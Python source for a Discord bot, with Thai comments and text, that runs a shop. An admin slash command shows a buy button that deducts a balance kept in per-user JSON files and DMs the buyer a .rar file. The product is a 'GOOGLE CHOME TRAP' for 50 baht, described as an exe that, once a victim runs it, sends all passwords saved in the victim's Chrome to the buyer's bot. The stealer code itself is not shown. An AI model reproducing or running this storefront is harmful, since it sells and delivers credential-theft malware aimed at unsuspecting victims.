import discord
from discord.interactions import Interaction
import requests
import random
import json
import os
from discord.ui import Button, View
from bs4 import BeautifulSoup
from discord import app_commands,ui

intents = discord.Intents.all()
client = discord.Client(intents=intents)

MYGUILD = discord.Object(id=1114949386619850762)

class MyClient(discord.Client):
    def __init__(self, *, intents: discord.Intents):
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        self.tree.copy_global_to(guild=MYGUILD)
        await self.tree.sync(guild=MYGUILD)

intents = discord.Intents.default()
client = MyClient(intents=intents)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    await client.change_presence(activity=discord.Streaming(name='กำลังพัฒนา', url='https://www.twitch.tv/toey.monifire'))


allowed_user_id = "" # --> ป้อน id คนที่สามรถใช้คำสั้งนี้ได้ 

@client.tree.command(description="test product")
async def product_1(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    if uid == allowed_user_id:
        button = Button(label="ซื้อสินค้า", style=discord.ButtonStyle.green, emoji="💸")
        async def button_callback(interaction: discord.Interaction):
            uid = str(interaction.user.id)
            folder_name = "money_id"
            file_name = f"{uid}.json"
            file_path = os.path.join(folder_name, file_name)

            with open(file_path, 'r') as file_money:
                data = json.load(file_money)
            money = data[uid]["money"]
            # ตั้งราคาส่วนด้านล่างนี้เลย !
            if float(money) >= 50.00:
                name_user = interaction.user.name
                price = 50.00
                Withdrawal = float(money) - price
                data = {
                    f"{uid}": {
                        "money": "{:.2f}".format(Withdrawal),
                        "name": name_user
                        }
                    }
                folder_name = "money_id"
                file_name = f"{uid}.json"
                file_path = os.path.join(folder_name, file_name)
                os.makedirs(folder_name, exist_ok=True)  
                with open(file_path, 'w') as file_money:
                    json.dump(data, file_money, indent=4)
                user = await client.fetch_user(uid)
                # ใส่ไฟล์สินค้าของคุณ ตัวอย่างเช่น fire.rar or fire.zip
                await user.send(file=discord.File("product_shop/google-chome-trap/google-chome-trap.rar"))
                embed = discord.Embed(title="\nทำรายการซื้อสินค้าสำเร็จ", description=f"**โปรดรับสินค้าจากเเชทบอทที่ส่งสินค้าไปให้คุณ !**", color=0xB0FC38)
                await interaction.response.send_message(embed=embed, delete_after=30)
            else:
                embed = discord.Embed(title="\nทำรายการซื้อสินค้าไม่สำเร็จ", description=f"**ยอดเงินคุณไม่เพียงพอในการซื้อสินค้าชิ้นนี้ !**", color=0xFF0000)
                await interaction.response.send_message(embed=embed, delete_after=30)
        button.callback = button_callback
        view = View(timeout=None)
        view.add_item(button)
        # เเก้ไข้ชื่อสินค้าส่วนด้านล้างนี้ !
        embed = discord.Embed(title="\nระบบสินค้า", description=f"**• {interaction.guild.name}**\n\n> **GOOGLE CHOME TRAP**", color=0xFCE5CD)
        embed.add_field(name="[ 📋 ] __DESCRIPTION ( คำอธิบายการทำงาน )__", value="สคริปต์จะทำงานโดยให้เยื่อกดใช้ไฟล์ exe เเล้วคุณจะได้รับ username password ทั้งหมดที่เยื่อบันทึกไว้ใน google chome ผ่านบอทของคุณ",inline=False)
        embed.add_field(name="[ ❔ ] __TUTORIAL ( วิธีใช้งาน )__", value="วิธีใช้งานอยู่ในไฟล์ที่มีชื่อว่า active.txt เมื่อคุณซื้อสินค้าเเล้ว",inline=False)
        embed.add_field(name="[ 📦 ] __PRODUCT ( สินค้า )__", value="สินค้าของคุณจะถูกส่งไปยังเเชท discord ของคุณโดยบอทส่งไป",inline=False)
        embed.add_field(name="[ 💵 ] __PRICE ( ราคา )__", value="ราคา 50.00 บาท")
        embed.set_image(url="https://images-ext-1.discordapp.net/external/4xDKAnuLeOoeFUhHfaFgDap5SgjCx_SlpQdtjMAPhqU/https/media.giphy.com/media/fecTAVKVVA2fSzg21J/giphy.gif")
        await interaction.response.send_message(embed=embed, view=view)
    else:
        embed = discord.Embed(title="\nสินค้าทดลอง", description=f"**คําสั่งนี้สำหรับเเอดมินเท่านั้น !**", color=0xFCE5CD)
        await interaction.response.send_message(embed=embed, delete_after=30)

client.run('') # กรอก token bot ของคุณ